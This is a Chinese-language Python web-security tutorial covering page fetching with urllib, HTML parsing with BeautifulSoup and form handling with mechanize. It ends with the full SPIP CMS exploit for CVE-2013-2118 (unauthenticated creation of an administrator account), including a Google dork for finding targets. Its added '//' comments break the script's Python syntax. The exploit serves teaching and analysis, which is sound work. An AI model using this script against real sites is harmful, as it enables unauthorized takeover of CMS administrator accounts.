# Python教程WEB安全篇

0x00 概述
-------

* * *

本文从实例代码出发，讲解了Python在WEB安全分析中的作用，以最基础的示例向读者展示了Python如何解析、获取、以及处理各种类型的WEB页面 系统环境：kali + beautifulsoup + mechanize，由于不涉及底层驱动设计，文中的示例代码可以在任意平台使用，当然无论什么平台都要安装好所用的插件。

0x01 利用python获取WEB页面
--------------------

* * *

```
Python 2.7.6 (default, Nov 10 2013, 19:24:24) [MSC v.1500 64 bit (AMD64)] on win32
Type "copyright", "credits" or "license()" for more information.
>>> import urllib

```

首先引入urllib以继续下面的分析

```
>>> httpResponse = urllib.urlopen("http://www.baidu.com")

```

以百度为例获取http响应

```
>>> httpResponse.code
200

```

状态为200 OK

```
>>> print httpResponse.read()[0:500]

```

由于篇幅限制，只显示前500好啦

```
<!DOCTYPE html><!--STATUS OK--><html><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="dns-prefetch" href="//s1.bdstatic.com"/><link rel="dns-prefetch" href="//t1.baidu.com"/><link rel="dns-prefetch" href="//t2.baidu.com"/><link rel="dns-prefetch" href="//t3.baidu.com"/><link rel="dns-prefetch" href="//t10.baidu.com"/><link rel="dns-prefetch" href="//t11.baidu.com"/><link rel="dns-prefetch" href="//t12.baidu.co

```

看一下http响应的结构

```
>>> dir(httpResponse) ['doc', 'init', 'iter', 'module', 'repr', 'close', 'code', 'fileno', 'fp', 'getcode', 'geturl', 'headers', 'info', 'next', 'read', 'readline', 'readlines', 'url']

```

查看响应所对应的url

```
>>> httpResponse.url
'http://www.baidu.com'

```

同理可查看headers结构的内部结构

```
>>> dir(httpResponse.headers)
['__contains__', '__delitem__', '__doc__', '__getitem__', '__init__', '__iter__', '__len__', '__module__', '__setitem__', '__str__', 'addcontinue', 'addheader', 'dict', 'encodingheader', 'fp', 'get', 'getaddr', 'getaddrlist', 'getallmatchingheaders', 'getdate', 'getdate_tz', 'getencoding', 'getfirstmatchingheader', 'getheader', 'getheaders', 'getmaintype', 'getparam', 'getparamnames', 'getplist', 'getrawheader', 'getsubtype', 'gettype', 'has_key', 'headers', 'iscomment', 'isheader', 'islast', 'items', 'keys', 'maintype', 'parseplist', 'parsetype', 'plist', 'plisttext', 'readheaders', 'rewindbody', 'seekable', 'setdefault', 'startofbody', 'startofheaders', 'status', 'subtype', 'type', 'typeheader', 'unixfrom', 'values']
>>> httpResponse.headers.items()
[('bdqid', '0xeb89374a00028e2e'), ('x-powered-by', 'HPHP'), ('set-cookie', 'BAIDUID=0C926CCF670378EAAA0BD29C611B3AE8:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com, BDSVRTM=0; path=/, H_PS_PSSID=5615_4392_1423_7650_7571_6996_7445_7539_6505_6018_7254_7607_7134_7666_7415_7572_7580_7475; path=/; domain=.baidu.com'), ('expires', 'Tue, 15 Jul 2014 02:37:00 GMT'), ('vary', 'Accept-Encoding'), ('bduserid', '0'), ('server', 'BWS/1.1'), ('connection', 'Close'), ('cxy_all', 'baidu+776b3a548a71afebd09c6640f9af5559'), ('cache-control', 'private'), ('date', 'Tue, 15 Jul 2014 02:37:47 GMT'), ('p3p', 'CP=" OTI DSP COR IVA OUR IND COM "'), ('content-type', 'text/html; charset=utf-8'), ('bdpagetype', '1')]

```

试着简单解析一个

```
>>> for header,value in httpResponse.headers.items() :
    print header+':'+value    

bdqid:0xeb89374a00028e2e
x-powered-by:HPHP
set-cookie:BAIDUID=0C926CCF670378EAAA0BD29C611B3AE8:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com, BDSVRTM=0; path=/, H_PS_PSSID=5615_4392_1423_7650_7571_6996_7445_7539_6505_6018_7254_7607_7134_7666_7415_7572_7580_7475; path=/; domain=.baidu.com
expires:Tue, 15 Jul 2014 02:37:00 GMT
vary:Accept-Encoding
bduserid:0
server:BWS/1.1
connection:Close
cxy_all:baidu+776b3a548a71afebd09c6640f9af5559
cache-control:private
date:Tue, 15 Jul 2014 02:37:47 GMT
p3p:CP=" OTI DSP COR IVA OUR IND COM "
content-type:text/html; charset=utf-8
bdpagetype:1

>>> url = http://www.baidu.com/s?wd=df&rsv_spt=1

```

完整的url用来获取http页面

```
>>> base_url = http://www.baidu.com

```

基础url

```
>>> args = {'wd':'df','rsv_spt':1}

```

传参单独构造

```
>>> encode_args = urllib.urlencode(args)

```

Urlencode可以编码url形式

```
>>> fp2=urllib.urlopen(base_url+'/s?'+encode_args)

```

重新尝试以这样的方式获取WEB页面

```
>>> print fp2.read()[0:500].decode("utf-8")

```

由于页面是utf-8的，因此解码中文自己设置

```
<!DOCTYPE html><!--STATUS OK--><html><head><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta http-equiv="content-type" content="text/html;charset=utf-8"><title>df_百度搜索</title><style data-for="result" >body{color:#333;background:#fff;padding:6px 0 0;margin:0;position:relative;min-width:900px}body,th,td,.p1,.p2{font-family:arial}p,form,ol,ul,li,dl,dt,dd,h3{margin:0;padding:0;list-style:none}input{padding-top:0;padding-bottom:0;-moz-box-sizing:border-box;-webkit-box-sizing
>>>

```

0x02 利用python解析html页面
---------------------

* * *

首先安装beautifulsoup ，http://www.crummy.com/software/BeautifulSoup/

```
root@kali:~/Desktop/beautifulsoup4-4.3.2# python setup.py install
running install
running build
running build_py
creating build/lib.linux-x86_64-2.7
creating build/lib.linux-x86_64-2.7/bs4
copying bs4/dammit.py -> build/lib.linux-x86_64-2.7/bs4
copying bs4/testing.py -> build/lib.linux-x86_64-2.7/bs4
copying bs4/element.py -> build/lib.linux-x86_64-2.7/bs4
copying bs4/__init__.py -> build/lib.linux-x86_64-2.7/bs4
…………………………………………………………部分省略
copying bs4/diagnose.py -> build/lib.linux-x86_64-2.7/bs4
creating build/lib.linux-x86_64-2.7/bs4/builder
copying bs4/builder/_lxml.py -> build/lib.linux-x86_64-2.7/bs4/builder
copying bs4/builder/_htmlparser.py -> build/lib.linux-x86_64-2.7/bs4/builder
root@kali:~/Desktop/beautifulsoup4-4.3.2#

```

下面就可以使用bs4了

```
root@kali:~# python
Python 2.7.3 (default, Jan  2 2013, 13:56:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from bs4 import BeautifulSoup

```

导入bs4的包（之前安装过了）

```
>>> import urllib
>>> html = urllib.urlopen('http://www.baidu.com')
>>> html.code
200
>>> bt = BeautifulSoup(html.read(),"lxml")

```

Lxml解析大概是kali自带的，windows下自己装比较麻烦

```
>>> bt.title

```

标题

```
<title>百度一下，你就知道</title>
>>> bt.title.string
u'\u767e\u5ea6\u4e00\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053'
>>> bt.meta
<meta content="text/html;charset=utf-8" http-equiv="content-type"/>
>>> bt.meta.next
<meta content="IE=Edge" http-equiv="X-UA-Compatible"/>
>>> bt.meta.next.next
<link href="//s1.bdstatic.com" rel="dns-prefetch"/>
>>> allMetaTags = bt.find_all('meta')

```

找出所有的meta数据标签

```
>>> allMetaTags
[<meta content="text/html;charset=utf-8" http-equiv="content-type"/>, <meta content="IE=Edge" http-equiv="X-UA-Compatible"/>, <meta content="0; url=/baidu.html?from=noscript" http-equiv="refresh"/>]
>>> allMetaTags[0]
<meta content="text/html;charset=utf-8" http-equiv="content-type"/>

>>> allLinks = bt.find_all('a')

```

找出所有的a标签（链接）

```
>>> allLinks[0]
<a href="http://www.baidu.com/gaoji/preferences.html" onmousedown="return user_c({'fm':'set','tab':'setting','login':'0'})">搜索设置</a>
>>> allLinks[1]
<a href="/" id="btop" onmousedown="return user_c({'fm':'set','tab':'index','login':'0'})">百度首页</a>

>>> for link in allLinks:
...     print link['href']
... 

```

试着简单的解析一下

```
http://www.baidu.com/gaoji/preferences.html
https://passport.baidu.com/v2/?login&tpl=mn&u=http%3A%2F%2Fwww.baidu.com%2F
https://passport.baidu.com/v2/?reg&regType=1&tpl=mn&u=http%3A%2F%2Fwww.baidu.com%2F
http://news.baidu.com/ns?cl=2&rn=20&tn=news&word=
http://tieba.baidu.com/f?kw=&fr=wwwt
http://zhidao.baidu.com/q?ct=17&pn=0&tn=ikaslist&rn=10&word=&fr=wwwt
http://music.baidu.com/search?fr=ps&key=
http://image.baidu.com/i?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&word=
http://v.baidu.com/v?ct=301989888&rn=20&pn=0&db=0&s=25&word=
http://map.baidu.com/m?word=&fr=ps01000
http://wenku.baidu.com/search?word=&lm=0&od=0

```

0x03 利用python+mechanize处理表单
---------------------------

* * *

```
root@kali:~# python
Python 2.7.3 (default, Jan  2 2013, 13:56:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import mechanize

```

导入mechanize

```
>>> br = mechanize.Browser()

```

构建一个浏览器实例

```
>>> br.open('http://www.17173.com')

```

打开一个有表单的页面

```
<response_seek_wrapper at 0x248db90 whose wrapped object = <closeable_response at 0x248d098 whose fp = <socket._fileobject object at 0x1f868d0>>>

>>> for form in br.forms():
...     print form
... 

<GET http://search.17173.com/jsp/news_press.jsp application/x-www-form-urlencoded
  <HiddenControl(charset=gbk) (readonly)>
  <TextControl(keyword=��������)>
  <SubmitControl(<None>=����) (readonly)>>
<searchask GET http://search.17173.com/jsp/game.jsp application/x-www-form-urlencoded
  <HiddenControl(charset=gbk) (readonly)>
  <TextControl(<None>=)>
  <TextControl(<None>=)>>
<voteform POST http://vote.17173.com/action/vote_process.php application/x-www-form-urlencoded
  <HiddenControl(vote_id=9624) (readonly)>
  <HiddenControl(vote_year=) (readonly)>
  <CheckboxControl(vote_item_9624[]=[49649, 49650, 49651, 49652, 49653, 49654, 49655, 49656])>
  <SubmitControl(<None>=) (readonly)>>
<GET http://search.17173.com/jsp/news_press.jsp application/x-www-form-urlencoded
  <HiddenControl(charset=gbk) (readonly)>
  <TextControl(keyword=��������)>
  <SubmitControl(<None>=����) (readonly)>>
>>> 

>>> br.select_form(nr=0)

```

选择要处理的表单

```
>>> br.form['keyword']='2013'

```

设置表单属性的值（TextControl）

```
>>> br.submit()

```

模拟浏览器提交表单

```
<response_seek_wrapper at 0x248dab8 whose wrapped object = <closeable_response at 0x249d950 whose fp = <socket._fileobject object at 0x243e5d0>>>
>>> br
<mechanize._mechanize.Browser instance at 0x242ff38>
>>>

```

0x04 实例分析
---------

* * *

以下是一个CMS的管理员密码能被越权找回漏洞，原作者信息均完整保留

```
#!/usr/bin/env python
# Exploit Title: SPIP - CMS < 3.0.9 / 2.1.22 / 2.0.23 - Privilege escalation to administrator account from non authenticated user
# Date: 04/30/2014
# Flaw finder : Unknown
# Exploit Author: Gregory DRAPERI
# Email: gregory |dot| draperi |at| gmail |dot| com
# Google Dork : inurl="spip.php"
# Vendor Homepage: www.spip.net
# Software Link: http://files.spip.org/spip/archives/
# Version: SPIP < 3.0.9 / 2.1.22 / 2.0.23
# Tested on: Windows 7 - SPIP 2.2.21
# CVE : CVE-2013-2118
'''
---------------------------------------------------------------------------------------------------------
Software Description:
SPIP is a free software content management system
---------------------------------------------------------------------------------------------------------
Vulnerability Details:
This vulnerability allows remote attackers to create an administrator account on the CMS without being authenticated.
To exploit the flaw, a SMTP configuration has to be configured on SPIP because the password is sent by mail.

'''
import urllib, urllib2
import cookielib
import sys
import re

def send_request(urlOpener, url, post_data=None):
//发送url（可选是否post）
   request = urllib2.Request(url)
//使用urllib2来处理http请求
   url = urlOpener.open(request, post_data)
   return url.read()

if len(sys.argv) < 4:
//简单的系统提示
   print "SPIP < 3.0.9 / 2.1.22 / 2.0.23 exploit by Gregory DRAPERI\n\tUsage: python script.py <SPIP base_url> <login> <mail>"
   exit()

base_url = sys.argv[1]
//网站地址
login = sys.argv[2]
//登陆地址
mail = sys.argv[3]
//越权发送邮件目的邮箱

cookiejar = cookielib.CookieJar()
//处理cookie以伪造身份
urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))


formulaire = send_request(urlOpener, base_url+"/spip.php?page=identifiants&mode=0minirezo")
print "[+] First request sended..."
//发送HTTP请求


m = re.search("<input name='formulaire_action_args' type='hidden'\n[^>]*", formulaire)

//寻找目标表单

m = re.search("(?<=value=')[\w\+/=]*",m.group(0));


formulaire_data = {'var_ajax' : 'form',
                   'page' : 'identifiants',
                   'mode' : '0minirezo',
                   'formulaire_action' : 'inscription',
                   'formulaire_action_args' : m.group(0),
                   'nom_inscription' : login,
                   'mail_inscription' : mail,
                   'nobot' : ''
                  }
//构造请求中各参数
formulaire_data = urllib.urlencode(formulaire_data)
//进行url编码


send_request(urlOpener, base_url+"/spip.php?page=identifiants&mode=0minirezo", formulaire_data)
print "[+] Second request sended"


print "[+] You should receive an email with credentials soon :) "
//第二次发送请求完毕后目标已经完成

```